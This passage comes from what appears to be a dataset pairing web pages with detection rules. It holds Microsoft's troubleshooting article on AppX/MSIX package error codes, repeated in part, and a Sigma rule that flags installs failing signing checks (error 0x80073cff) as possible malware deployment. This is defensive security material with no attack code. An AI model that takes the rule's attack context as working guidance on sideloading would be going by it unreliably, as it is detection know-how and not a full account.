resigned, it is no longer bitwise identical to the previously installed package. Two possible options to fix this error are: (1) Increment the version number of the app, then rebuild and resign the package (2) Remove the old package for every user on the system before installing the new package.                                                                                                                                                |\n| **ERROR_NEEDS_REMEDIATION**                                                                            | 0x80073CFC | The app can't be started. Try reinstalling the app|\n| **ERROR_INSTALL_**  <br>**PREREQUISITE_FAILED**                                                        | 0x80073CFD | A specified install prerequisite couldn't be satisfied|\n| **ERROR_PACKAGE_**  <br>**REPOSITORY_CORRUPTED**                                                       | 0x80073CFE | The package repository is corrupted.  <br>You may get this error if the folder referenced by this registry key doesn't exist or is corrupted:  <br>**HKLM\\\\Software\\\\Microsoft\\\\Windows</strong>  <br>**CurrentVersion\\\\Appx\\\\PackageRepositoryRoot**  <br>To recover from this state, refresh your PC.  <br>**                                                                                                                                                                                                                                                                                                                                                                                                                                                            |\n| **ERROR_INSTALL_**  <br>**POLICY_FAILURE**                                                             | 0x80073CFF | To install this app, you need a developer license or a sideloading-enabled system.  <br>You may get this error if the package doesn't meet one of the following requirements:  <br><br>*   The app is deployed using F5 in Visual Studio on a computer with a Windows developer license.<br>*   The package is signed with a Microsoft signature and deployed as part of Windows or from the Microsoft Store.<br>*   The package is signed with a trusted signature and installed on a computer with a developer license, a domain-joined computer with the AllowAllTrustedApps policy enabled, or a computer with a Windows Sideloading license with the AllowAllTrustedApps policy enabled.                                                                              |\n| **ERROR_PACKAGE_UPDATING**                                                                             | 0x80073D00 | The app can't be started because it's currently updating|\n| **ERROR_DEPLOYMENT_**  <br>**BLOCKED_BY_POLICY**                                                       | 0x80073D01 | The package deployment operation is blocked by policy. Contact your system administrator.  <br>Possible causes:  <br><br>*   Package deployment is blocked by Application Control Policies.<br>*   Package deployment is blocked by the \"Allow deployment operations in special profiles\" policy.<br><br>One of the possible reasons is a need for a roaming profile. For information about setting up Roaming User Profiles on user accounts, see [Deploy Roaming User Profiles](/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/jj649079(v=ws.11)). If there are no policies configured on your system and you still see this error, perhaps you are logged in with a temporary profile. Log out and log in again, then try the operation again. |\n| **ERROR_PACKAGES_IN_USE**                                                                              | 0x80073D02 | The package couldn't be installed because resources it modifies are currently in use|\n| **ERROR_RECOVERY_**  <br>**FILE_CORRUPT**                                                              | 0x80073D03 | The package couldn't be recovered because data that's necessary for recovery is corrupted|\n| **ERROR_INVALID_**  <br>**STAGED_SIGNATURE**                                                           | 0x80073D04 | The signature isn't valid. To register in developer mode, AppxSignature.p7x and AppxBlockMap.xml must be valid or shouldn't be present.  <br>If you are a developer using F5 with Visual Studio, ensure that your built project directory doesn't contain signature or block map files from previous versions of the package.                                                                                                                                                                                                                                                                                                                                                                                                                                              |\n| **ERROR_DELETING_EXISTING_**  <br>**APPLICATIONDATA_STORE_FAILED**                                     | 0x80073D05 | An error occurred while deleting the package's previously existing application data.  <br>You can get this error if the [simulator](/en-us/previous-versions/hh441475(v=vs.110)) is running. Close the simulator. You can also get this error if there are files open in the app data (for example, if you have a log file open in a text editor).                                                                                                                                                                                                                                                                                                                                                                                                                         |\n| **ERROR_INSTALL_**  <br>**PACKAGE_DOWNGRADE**                                                          | 0x80073D06 | The package couldn't be installed because a higher version of this package is already installed|\n| **ERROR_SYSTEM_**  <br>**NEEDS_REMEDIATION**                                                           | 0x80073D07 | An error in a system binary was detected. To fix the problem, try refreshing the|\n| **ERROR_APPX_INTEGRITY_**  <br>**FAILURE_EXTERNAL**                                                    | 0x80073D08 | A corrupted non-Windows binary was detected on the system|\n| **ERROR_RESILIENCY_**  <br>**FILE_CORRUPT**                                                            | 0x80073D09 | The operation couldn't be resumed because data that's necessary for recovery is corrupted|\n| **ERROR_INSTALL_FIREWALL_**  <br>**SERVICE_NOT_RUNNING**                                               | 0x80073D0A | The package couldn't be installed because the Windows Firewall service isn't running. Enable the Windows Firewall service and try again|\n| **ERROR_PACKAGE_MOVE_FAILED**                                                                          | 0x80073D0B | The package move operation failed|\n| **ERROR_INSTALL_VOLUME_**  <br>**NOT_EMPTY**                                                           | 0x80073D0C | The deployment operation failed because the volume is not empty.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |\n| **ERROR_INSTALL_VOLUME_**  <br>**OFFLINE**                                                             | 0x80073D0D | The deployment operation failed because the volume is offline. For a package update, the volume refers to the installed volume of all package versions|\n| **ERROR_INSTALL_VOLUME_**  <br>**CORRUPT**                                                             | 0x80073D0E | The deployment operation failed because the specified volume is corrupt|\n| **ERROR_NEEDS_REGISTRATION**                                                                           | 0x80073D0F | The deployment operation failed because the specified application needs to be registered first.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |\n| **ERROR_INSTALL_WRONG_**  <br>**PROCESSOR_ARCHITECTURE**                                               | 0x80073D10 | The deployment operation failed because the package targets the wrong processor architecture|\n| **ERROR_DEV_SIDELOAD_**  <br>**LIMIT_EXCEEDED**                                                        | 0x80073D11 | You have reached the maximum number of developer sideloaded packages allowed on this device. Please uninstall a sideloaded package and try again|\n| **ERROR_INSTALL_OPTIONAL_**  <br>**PACKAGE_REQUIRES_**  <br>**MAIN_PACKAGE**                           | 0x80073D12 | A main app package is required to install this optional package. Install the main package first and try again|\n| **ERROR_PACKAGE_NOT_**  <br>**SUPPORTED_ON_FILESYSTEM**                                                | 0x80073D13 | This app package type is not supported on this filesystem|\n| **ERROR_PACKAGE_MOVE_**  <br>**BLOCKED_BY_STREAMING**                                                  | 0x80073D14 | Package move operation is blocked until the application has finished streaming|\n| **ERROR_INSTALL_OPTIONAL_**  <br>**PACKAGE_APPLICATIONID_**  <br>**NOT_UNIQUE**                        | 0x80073D15 | A main or another optional app package has the same application ID as this optional package. Change the application ID for the optional package to avoid conflicts|\n| **ERROR_PACKAGE_STAGING_**  <br>**ONHOLD**                                                             | 0x80073D16 | This staging session has been held to allow another staging operation to be prioritized|\n| **ERROR_INSTALL_INVALID_**  <br>**RELATED_SET_UPDATE**                                                 | 0x80073D17 | A related set cannot be updated because the updated set is invalid. All packages in the related set must be updated at the same time|\n| **ERROR_INSTALL_OPTIONAL_**  <br>**PACKAGE_REQUIRES_MAIN_**  <br>**PACKAGE_FULLTRUST_CAPABILITY**      | 0x80073D18 | An optional package with a FullTrust entry point requires the main package to have the **runFullTrust** capability|\n| **ERROR_DEPLOYMENT_BLOCKED_**  <br>**BY_USER_LOG_OFF**                                                 | 0x80073D19 | An error occurred because a user was logged off|\n| **ERROR_PROVISION_OPTIONAL_**  <br>**PACKAGE_REQUIRES_MAIN_**  <br>**PACKAGE_PROVISIONED**             | 0x80073D1A | An optional package provision requires the dependency main package to also be provisioned|\n| **ERROR_PACKAGES_REPUTATION_**  <br>**CHECK_FAILED**                                                   | 0x80073D1B | The packages failed the [SmartScreen reputation check](/en-us/windows/security/threat-protection/windows-defender-smartscreen/windows-defender-smartscreen-overview).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |\n| **ERROR_PACKAGES_REPUTATION_**  <br>**CHECK_TIMEDOUT**                                                 | 0x80073D1C | The [SmartScreen reputation check](/en-us/windows/security/threat-protection/windows-defender-smartscreen/windows-defender-smartscreen-overview) operation timed out|\n| **ERROR_DEPLOYMENT_OPTION_**  <br>**NOT_SUPPORTED**                                                    | 0x80073D1D | The current deployment option is not supported|\n| **ERROR_APPINSTALLER_**  <br>**ACTIVATION_BLOCKED**                                                    | 0x80073D1E | Activation is blocked due to the .appinstaller update settings for this app|\n| **ERROR_REGISTRATION_FROM_**  <br>**REMOTE_DRIVE_NOT_SUPPORTED**                                       | 0x80073D1F | Remote drives are not supported. Use **\\\\server\\\\share** to register a remote package|\n| **ERROR_APPX_RAW_**  <br>**DATA_WRITE_FAILED**                                                         | 0x80073D20 | Failed to process and write downloaded package data to disk|\n| **ERROR_DEPLOYMENT_BLOCKED_**  <br>**BY_VOLUME_POLICY_PACKAGE**                                        | 0x80073D21 | The deployment operation was blocked due to a per-package-family policy restricting deployments on a non-system volume. Per policy, this app must be installed to the system drive, but that's not set as the default. In Storage settings, make the system drive the default location to save new content, then retry the install.                                                                                                                                                                                                                                                                                                                                                                                                                                        |\n| **ERROR_DEPLOYMENT_BLOCKED_**  <br>**BY_VOLUME_POLICY_MACHINE**                                        | 0x80073D22 | The deployment operation was blocked due to a machine-wide policy restricting deployments on a non-system volume. Per policy, this app must be installed to the system drive, but that's not set as the default. In Storage settings, make the system drive the default location to save new content, then retry the install.                                                                                                                                                                                                                                                                                                                                                                                                                                              |\n| **ERROR_DEPLOYMENT_BLOCKED_**  <br>**BY_PROFILE_POLICY**                                               | 0x80073D23 | The deployment operation was blocked because special profile deployment is not allowed (special profiles are user profiles where changes are discarded after the user signs out). Try logging into an account that is not a special profile. You can try logging out and logging back into the current account, or try logging into a different account.                                                                                                                                                                                                                                                                                                                                                                                                                   |\n| **ERROR_DEPLOYMENT_FAILED_**  <br>**CONFLICTING_MUTABLE_PACKAGE_**  <br>**DIRECTORY**                  | 0x80073D24 | The deployment operation failed due to a conflicting package's [mutable package directory](/en-us/uwp/schemas/appxpackage/uapmanifestschema/element-desktop6-mutablepackagedirectory). To install this package, remove the existing package with the conflicting mutable package directory.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |\n| **ERROR_SINGLETON_RESOURCE_**  <br>**INSTALLED_IN_ACTIVE_USER**                                        | 0x80073D25 | The package installation failed because a singleton resource was specified and another user with that package installed is logged in. Make sure that all active users with the package installed are logged out and retry installation|\n| ERROR_DIFFERENT_VERSION_  <br>**OF_PACKAGED_SERVICE_INSTALLED**                                        | 0x80073D26 | The package installation failed because a different version of the service is installed. Try installing a newer version of the package|\n| **ERROR_SERVICE_EXISTS_**  <br>**AS_NON_PACKAGED_SERVICE**                                             | 0x80073D27 | The package installation failed because a version of the service exists outside of an .msix/.appx package. Contact your software vendor|\n| **ERROR_PACKAGED_SERVICE_**  <br>**REQUIRES_ADMIN_PRIVILEGES**                                         | 0x80073D28 | The package installation failed because administrator privileges are required. Contact an administrator to install this package|\n| **ERROR_REDIRECTION_TO_**  <br>**DEFAULT_ACCOUNT_NOT_ALLOWED**                                         | 0x80073D29 | The package deployment failed because the operation would have redirected to default account, when the caller said not to do so|\n| **ERROR_PACKAGE_LACKS_**  <br>**CAPABILITY_TO_DEPLOY_ON_HOST**                                         | 0x80073D2A | The package deployment failed because the package requires a capability to natively target this host|\n| **ERROR_UNSIGNED_PACKAGE_**  <br>**INVALID_CONTENT**                                                   | 0x80073D2B | The package deployment failed because its content is not valid for an unsigned package|\n| **ERROR_UNSIGNED_PACKAGE_**  <br>**INVALID_PUBLISHER_NAMESPACE**                                       | 0x80073D2C | The package deployment failed because its publisher is not in the unsigned namespace|\n| **ERROR_SIGNED_PACKAGE_**  <br>**INVALID_PUBLISHER_NAMESPACE**                                         | 0x80073D2D | The package deployment failed because its publisher is not in the signed namespace|\n| **ERROR_PACKAGE_EXTERNAL_**  <br>**LOCATION_NOT_ALLOWED**                                              | 0x80073D2E | The package deployment failed because its publisher is not in the signed namespace.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |\n| **ERROR_INSTALL_FULLTRUST_**  <br>**HOSTRUNTIME_REQUIRES_MAIN_**  <br>**PACKAGE_FULLTRUST_CAPABILITY** | 0x80073D2F | A host runtime dependency resolving to a package with full trust content requires the main package to have the **runFullTrust** capability|\n| **APPX_E_PACKAGING_INTERNAL**                                                                          | 0x80080200 | The packaging API has encountered an internal error|\n| **APPX_E_INTERLEAVING_**  <br>**NOT_ALLOWED**                                                          | 0x80080201 | The package isn't valid because its contents are interleaved|\n| **APPX_E_RELATIONSHIPS_**  <br>**NOT_ALLOWED**                                                         | 0x80080202 | The package isn't valid because it contains OPC relationships|\n| **APPX_E_MISSING_**  <br>**REQUIRED_FILE**                                                             | 0x80080203 | The package isn't valid because it's missing a manifest or block map, or a code integrity file is present but a signature file is missing.  <br>Ensure that the package isn't missing one or more of these required files:  <br><br>*   \\\\AppxManifest.xml<br>*   \\\\AppxBlockMap.xml<br><br>If the package contains \\\\AppxMetadata\\\\CodeIntegrity.cat, it must also contain \\\\AppxSignature.p7x.                                                                                                                                                                                                                                                                                                                                                                           |\n| **APPX_E_INVALID_MANIFEST**                                                                            | 0x80080204 | The package's AppxManifest.xml file isn't valid|\n| **APPX_E_INVALID_BLOCKMAP**                                                                            | 0x80080205 | The package's AppxBlockMap.xml file isn't valid.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |\n| **APPX_E_CORRUPT_CONTENT**                                                                             | 0x80080206 | The package contents can't be read because it's corrupted|\n| **APPX_E_BLOCK_**  <br>**HASH_INVALID**                                                                | 0x80080207 | The computed hash value of the block doesn't match the has value stored in the block map.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |\n| **APPX_E_REQUESTED_**  <br>**RANGE_TOO_LARGE**                                                         | 0x80080208 | The requested byte range is over 4 GB when translated to a byte range of blocks|\n| **TRUST_E_NOSIGNATURE**                                                                                | 0x800B0100 | No signature is present in the subject.  <br>You may get this error if the package is unsigned or the signature isn't valid. The package must be signed to be deployed|\n| **CERT_E_UNTRUSTEDROOT**                                                                               | 0x800B0109 | A certificate chain processed, but terminated in a root certificate which isn't trusted by the trust provider.  <br>See [Signing a package](/en-us/previous-versions/br230260(v=vs|\n| **CERT_E_CHAINING**                                                                                    | 0x800B010A | A certificate chain couldn't be built to a trusted root certification authority.  <br>See [Signing a package](/en-us/previous-versions/br230260(v=vs|\n| **APPX_E_INVALID_**  <br>**SIP_CLIENT_DATA**                                                           | 0x80080209 | The [**SIP_SUBJECTINFO**](/en-us/windows/win32/api/mssip/ns-mssip-sip_subjectinfo)structure used to sign the package didn't contain the required data|\n| **APPX_E_INVALID_**  <br>**KEY_INFO**                                                                  | 0x8008020A | The [**APPX_KEY_INFO**](/en-us/windows/win32/api/appxpackaging/ns-appxpackaging-appx_key_info) structure used to encrypt or decrypt the package contains invalid data|\n| **APPX_E_INVALID_**  <br>**CONTENTGROUPMAP**                                                           | 0x8008020B | The .msix/.appx package's content group map is invalid|\n| **APPX_E_INVALID_**  <br>**APPINSTALLER**                                                              | 0x8008020C | The [.appinstaller file](/en-us/windows/msix/app-installer/app-installer-root) for the package is invalid|\n| **APPX_E_DELTA_BASELINE_**  <br>**VERSION_MISMATCH**                                                   | 0x8008020D | The baseline package version in delta package does not match the version in the baseline package to be updated|\n| **APPX_E_DELTA_PACKAGE_**  <br>**MISSING_FILE**                                                        | 0x8008020E | The delta package is missing a file from the updated package|\n| **APPX_E_INVALID_**  <br>**DELTA_PACKAGE**                                                             | 0x8008020F | The delta package is invalid|\n| **APPX_E_DELTA_APPENDED_**  <br>**PACKAGE_NOT_ALLOWED**                                                | 0x80080210 | The delta appended package is not allowed for the current operation|\n| **APPX_E_INVALID_**  <br>**PACKAGING_LAYOUT**                                                          | 0x80080211 | The packaging layout file is invalid|\n| **APPX_E_INVALID_**  <br>**PACKAGESIGNCONFIG**                                                         | 0x80080212 | The packageSignConfig file is invalid.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |\n| **APPX_E_RESOURCESPRI_**  <br>**NOT_ALLOWED**                                                          | 0x80080213 | The resources.pri file is not allowed when there are no resource elements in the package manifest|\n| **APPX_E_FILE_**  <br>**COMPRESSION_MISMATCH**                                                         | 0x80080214 | The compression state of file in baseline and updated package does not match.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |\n| **APPX_E_INVALID_**  <br>**PAYLOAD_PACKAGE_EXTENSION**                                                 | 0x80080215 | Non .appx extensions are not allowed for payload packages targeting older platforms|\n| **APPX_E_INVALID_**  <br>**ENCRYPTION_EXCLUSION_FILE_LIST**                                            | 0x80080216 | The encryptionExclusionFileList file is invalid|\n\n## Applications don't start and their names are dimmed\n\nOn a computer running Windows 10 or later, you can't start some applications, and the application names appear dimmed.\n\n```image\nAlt: Some application names appear dimmed in the Start menu\nDescription: The image depicts a Windows Start menu containing a list of applications, some of which are dimmed. The highlighted application names include '7-Zip', 'Access 2016', 'Acrobat Distiller 6.0', 'Acrobat Reader DC', and 'Adobe Acrobat 6.0 Standard'. The dimmed appearance indicates that these applications may not be functioning properly, aligning with the troubleshooting context provided, which discusses issues related to application startup and error messages associated with certain Windows apps.\nTranscription: |\n  #\n  7-Zip\n  A\n  Access 2016\n  Acrobat Distiller 6.0\n  Acrobat Reader DC\n  Adobe Acrobat 6.0 Standard\n```\n\nWhen you try to open an application by selecting the dimmed name, you may receive one of the following error messages:\n\n> There's a problem with <em>application name</em>. Contact your system administrator about repairing or reinstalling it\n> Error: This app can't open\n\nAdditionally, the following event entries are logged in the \"Microsoft-Windows-TWinUI/Operational\" log under **Applications and Services\\Microsoft\\Windows\\Apps**:\n\n> Log Name: Microsoft-Windows-TWinUI/Operational\n> Source: Microsoft-Windows-Immersive-Shell\n> Date: <em>date</em>\n> Event ID: 5960\n> Task Category: (5960)\n> Level: Error\n> Keywords:\n> Description:\n> Activation of the app Microsoft.BingNews_8wekyb3d8bbwe!AppexNews for the Windows. Launch contract was blocked with error 0x80073CFC because its package is in state: Modified.\n\n### Cause\n\nThis issue occurs because the registry entry for the status value of application's corresponding package was modified.\n\n### Resolution\n\n> **Warning**\n> Serious problems might occur if you modify the registry incorrectly by using Registry Editor or by using another method. These problems might require that you reinstall the operating system. Microsoft cannot guarantee that these problems can be solved. Modify the registry at your own risk.\n\nTo fix this issue:\n\n1. Start Registry Editor, and then locate the **HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModel\\StateChange\\PackageList** subkey.\n2. To back up the subkey data, right-click **PackageList**, select **Export**, and then save the data as a registry file.\n3. For each of the applications that are listed in the Event ID 5960 log entries, follow these steps:\n   1. Locate the **PackageStatus** entry.\n   2. Set the value of **PackageStatus** to zero (**0**).\n\n   > **Note**\n   > If there are no entries for the application under **PackageList**, then the issue has some other cause. In the case of the example event in this article, the full subkey is **HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModel\\StateChange\\PackageList\\Microsoft.BingNews_8wekyb3d8bbwe!AppexNews\\PackageStatus**.\n\n4. Restart the computer.\n\n## Get additional help\n\nIf you need further help with resolving a problem you are experiencing when packaging, deploying, or querying a Windows app package (.msix/.appx) as a developer, refer to these additional developer support resources.\n\n- Microsoft Q&A offers relevant and timely answers to your technical problems from a community of experts and Microsoft engineers.\n- For community assistance with development questions, there are our forums, and StackOverflow.\n- The Windows developer support site explains other support options.\n\n## Related topics\n\n- How to sign an app package using SignTool\n- How to troubleshoot app package signature errors",
    "sigma_rule": {
      "title": "Suspicious AppX Package Installation Attempt",
      "id": "898d5fc9-fbc3-43de-93ad-38e97237c344",
      "status": "test",
      "description": "Detects an appx package installation with the error code \"0x80073cff\" which indicates that the package didn't meet the signing requirements and could be suspicious",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 401,
          "ErrorCode": "0x80073cff"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate AppX packages not signed by MS used part of an enterprise"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_susp_appx_package_installation.yml",
    "id": "701"
  },
  {
    "url": "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
    "markdown": "# Troubleshooting packaging, deployment, and query of Windows apps\n\nUse these suggestions to troubleshoot problems you experience when packaging, deploying, or querying a Windows app package (.msix/.appx) as a developer.\n\n> **Note**\n> This article is intended for developers. If you are not a developer and you are looking for help with a Windows app installation error, see Windows support.\n\n## Get diagnostic information\n\nWhen an API fails, it returns an error code that describes the problem. If the error code doesn't provide enough information, you find more diagnostic information in the detailed event logs.\n\nTo access the packaging and deployment event logs by using **Event Viewer**, follow these steps:\n\n1. Perform one of the following steps:\n   - Click **Start** on the Windows menu, type **Event Viewer**, and press **Enter**.\n   - Run **eventvwr.msc**.\n2. In the left page, expand **Event Viewer (Local) > Applications and Services Logs > Microsoft > Windows**.\n3. Check for available logs under these categories:\n   - **AppxPackagingOM > Microsoft-Windows-AppxPackaging/Operational**\n   - **AppXDeployment-Server > Microsoft-Windows-AppXDeploymentServer/Operational**\n\nStart by looking at the logs under **AppXDeployment-Server**. If the error was caused by **0x80073CF0** or **ERROR_INSTALL_OPEN_PACKAGE_FAILED**, additional details may be present in the **AppxpackagingOM** logs.\n\nYou can also use the Get-AppxLog command in PowerShell to get the first few logged events. The following example displays the logs associated with the most recent deployment operation.\n\n```\nGet-Appxlog\n```\n\nThe following example displays the logs associated with the most recent deployment operation in an interactive table in a separate window.\n\n```\nGet-Appxlog | Out-GridView\n```\n\n## Common error codes\n\nThis table lists some of the most common error codes. If you need further help with one of these errors, or if you're encountering an error code not in this list, see additional help options.\n\n| Error code                                                                                             | Value      | Description and possible causes|\n| ------------------------------------------------------------------------------------------------------ | ---------- ||\n| **E_FILENOTFOUND**                                                                                     | 0x80070002 | File or path is not found. This can occur during a COM typelib validation requires that the path for the directory actually exist within your MSIX package|\n| **ERROR_BAD_FORMAT**                                                                                   | 0x8007000B | The package isn't correctly formatted and needs to be re-built or re-signed.  <br>You may get this error if there is a mismatch between the signing certificate subject name and the AppxManifest.xml publisher name.  <br>See [How to sign an app package using SignTool](how-to-sign-a-package-using-signtool).                                                                                                                                                                                                                                                                                                                                                                                                                                                          |\n| **E_INVALIDARG**                                                                                       | 0x80070057 | One or more arguments are not valid. If you check the AppXDeployment-Server event log and see the following event: \"While installing the package, the system failed to register the windows.repositoryExtension extension due to the following error: The parameter is incorrect.\"  <br>You may get this error if the manifest elements DisplayName or Description contain characters disallowed by Windows firewall such as `\\                                                                                                                                                                                                                                                                                                                                            | `, due to which Windows fails to create the AppContainer profile for the package. Please remove these characters from the manifest and try installing the package. |\n| **ERROR_INSTALL_OPEN_**  <br>**PACKAGE_FAILED**                                                        | 0x80073CF0 | The package couldn't be opened.  <br>Possible causes:  <br><br>*   The package is unsigned.<br>*   The publisher name doesn't match the signing certificate subject.<br>*   The file:// prefix is missing or the package couldn't be found at the specified location.<br><br>For more information, check the **AppxPackagingOM** event log.                                                                                                                                                                                                                                                                                                                                                                                                                                |\n| **ERROR_INSTALL_PACKAGE_**  <br>**NOT_FOUND**                                                          | 0x80073CF1 | The package couldn't be found.  <br>You may get this error while removing a package that isn't installed for the current user|\n| **ERROR_INSTALL_INVALID_**  <br>**PACKAGE**                                                            | 0x80073CF2 | The package data isn't valid|\n| **ERROR_INSTALL_RESOLVE_**  <br>**DEPENDENCY_FAILED**                                                  | 0x80073CF3 | The package failed update, dependency, or conflict validation.  <br>Possible causes:  <br><br>*   The incoming package conflicts with an installed package.<br>*   A specified package dependency can't be found.<br>*   The package doesn't support the correct processor architecture.<br><br>For more informtion, check the **AppXDeployment-Server** event log.                                                                                                                                                                                                                                                                                                                                                                                                        |\n| **ERROR_INSTALL_OUT_**  <br>**OF_DISK_SPACE**                                                          | 0x80073CF4 | There isn't enough disk space on your computer. Free some space and try again|\n| **ERROR_INSTALL_NETWORK_**  <br>**FAILURE**                                                            | 0x80073CF5 | The package can't be downloaded|\n| **ERROR_INSTALL_**  <br>**REGISTRATION_FAILURE**                                                       | 0x80073CF6 | The package can't be registered.  <br>For more information, check the **AppXDeployment-Server** event log|\n| **ERROR_INSTALL_**  <br>**DEREGISTRATION_EFAILURE**                                                    | 0x80073CF7 | The package can't be unregistered.  <br>You may get this error while removing a package.  <br>For more information, check the **AppXDeployment-Server** event log|\n| **ERROR_INSTALL_CANCEL**                                                                               | 0x80073CF8 | The user canceled the install request|\n| **ERROR_INSTALL_FAILED**                                                                               | 0x80073CF9 | Package install failed. Contact the software vendor.  <br>For more information, check the **AppXDeployment-Server** event log|\n| **ERROR_REMOVE_FAILED**                                                                                | 0x80073CFA | Package removal failed.  <br>You may get this error for failures that occur during package uninstall.  <br>For more information, see [**RemovePackageAsync**](/en-us/uwp/api/windows.management.deployment.packagemanager.removepackageasync).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |\n| **ERROR_PACKAGE_**  <br>**ALREADY_EXISTS**                                                             | 0x80073CFB | The provided package is already installed, and reinstallation of the package is blocked.  <br>You may get this error if installing a package that is not bitwise identical to the package that is already installed. Note that the digital signature is also part of the package. Hence if a package is rebuilt or resigned, it is no longer bitwise identical to the previously installed package. Two possible options to fix this error are: (1) Increment the version number of the app, then rebuild and resign the package (2) Remove the old package for every user on the system before installing the new package.                                                                                                                                                |\n| **ERROR_NEEDS_REMEDIATION**                                                                            | 0x80073CFC | The app can't be started. Try reinstalling the app|\n| **ERROR_INSTALL_**  <br>**PREREQUISITE_FAILED**                                                        | 0x80073CFD | A specified install prerequisite couldn't be satisfied|\n| **ERROR_PACKAGE_**  <br>**REPOSITORY_CORRUPTED**                                                       | 0x80073CFE | The package repository is corrupted.  <br>You may get this error if the folder referenced by this registry key doesn't exist or is corrupted:  <br>**HKLM\\\\Software\\\\Microsoft\\\\Windows</strong>  <br>**CurrentVersion\\\\Appx\\\\PackageRepositoryRoot**  <br>To recover from this state, refresh your PC.  <br>**                                                                                                                                                                                                                                                                                                                                                                                                                                                            |\n| **ERROR_INSTALL_**  <br>**POLICY_FAILURE**                                                             | 0x80073CFF | To install this app, you need a developer license or a sideloading-enabled system.  <br>You may get this error if the package doesn't meet one of the following requirements:  <br><br>*   The app is deployed using F5 in Visual Studio on a computer with a Windows developer license.<br>*   The package is signed with a Microsoft signature and deployed as part of Windows or from the Microsoft Store.<br>*   The package is signed with a trusted signature and installed on a computer with a developer license, a domain-joined computer with the AllowAllTrustedApps policy enabled, or a computer with a Windows Sideloading license with the AllowAllTrustedApps policy enabled.                                                                              |\n| **ERROR_PACKAGE_UPDATING**                                                                             | 0x80073D00 | The app can't be started because it's currently updating|\n| **ERROR_DEPLOYMENT_**  <br>**BLOCKED_BY_POLICY**                                                       | 0x80073D01 | The package deployment operation is blocked by policy. Contact your system administrator.  <br>Possible causes:  <br><br>*   Package deployment is blocked by Application Control Policies.<br>*   Package deployment is blocked by the \"Allow deployment operations in special profiles\" policy.<br><br>One of the possible reasons is a need for a roaming profile. For information about setting up Roaming User Profiles on user accounts, see [Deploy Roaming User Profiles](/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/jj649079(v=ws.11)). If there are no policies configured on your system and you still see this error, perhaps you are logged in with a temporary profile. Log out and log in again, then try the operation again. |\n| **ERROR_PACKAGES_IN_USE**                                                                              | 0x80073D02 | The package couldn't be installed because resources it modifies are currently in use.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |\n| **ERROR_RECOVERY_**  <br>**FILE_CORRUPT**                                                              | 0x80073D03 | The package couldn't be recovered because data that's necessary for recovery is corrupted|\n| **ERROR_INVALID_**  <br>**STAGED_SIGNATURE**                                                           | 0x80073D04 | The signature isn't valid. To register in developer mode, AppxSignature.p7x and AppxBlockMap.xml must be valid or shouldn't be present.  <br>If you are a developer using F5 with Visual Studio, ensure that your built project directory doesn't contain signature or block map files from previous versions of the package.                                                                                                                                                                                                                                                                                                                                                                                                                                              |\n| **ERROR_DELETING_EXISTING_**  <br>**APPLICATIONDATA_STORE_FAILED**                                     | 0x80073D05 | An error occurred while deleting the package's previously existing application data.  <br>You can get this error if the [simulator](/en-us/previous-versions/hh441475(v=vs.110)) is running. Close the simulator. You can also get this error if there are files open in the app data (for example, if you have a log file open in a text editor).                                                                                                                                                                                                                                                                                                                                                                                                                         |\n| **ERROR_INSTALL_**  <br>**PACKAGE_DOWNGRADE**                                                          | 0x80073D06 | The package couldn't be installed because a higher version of this package is already installed|\n| **ERROR_SYSTEM_**  <br>**NEEDS_REMEDIATION**                                                           | 0x80073D07 | An error in a system binary was detected. To fix the problem, try refreshing the|\n| **ERROR_APPX_INTEGRITY_**  <br>**FAILURE_EXTERNAL**                                                    | 0x80073D08 | A corrupted non-Windows binary was detected on the system|\n| **ERROR_RESILIENCY_**  <br>**FILE_CORRUPT**                                                            | 0x80073D09 | The operation couldn't be resumed because data that's necessary for recovery is corrupted|\n| **ERROR_INSTALL_FIREWALL_**  <br>**SERVICE_NOT_RUNNING**                                               | 0x80073D0A | The package couldn't be installed because the Windows Firewall service isn't running. Enable the Windows Firewall service and try again|\n| **ERROR_PACKAGE_MOVE_FAILED**                                                                          | 0x80073D0B | The package move operation failed|\n| **ERROR_INSTALL_VOLUME_**  <br>**NOT_EMPTY**                                                           | 0x80073D0C | The deployment operation failed because the volume is not empty|\n| **ERROR_INSTALL_VOLUME_**  <br>**OFFLINE**                                                             | 0x80073D0D | The deployment operation failed because the volume is offline. For a package update, the volume refers to the installed volume of all package versions|\n| **ERROR_INSTALL_VOLUME_**  <br>**CORRUPT**                                                             | 0x80073D0E | The deployment operation failed because the specified volume is corrupt|\n| **ERROR_NEEDS_REGISTRATION**                                                                           | 0x80073D0F | The deployment operation failed because the specified application needs to be registered first|\n| **ERROR_INSTALL_WRONG_**  <br>**PROCESSOR_ARCHITECTURE**                                               | 0x80073D10 | The deployment operation failed because the package targets the wrong processor 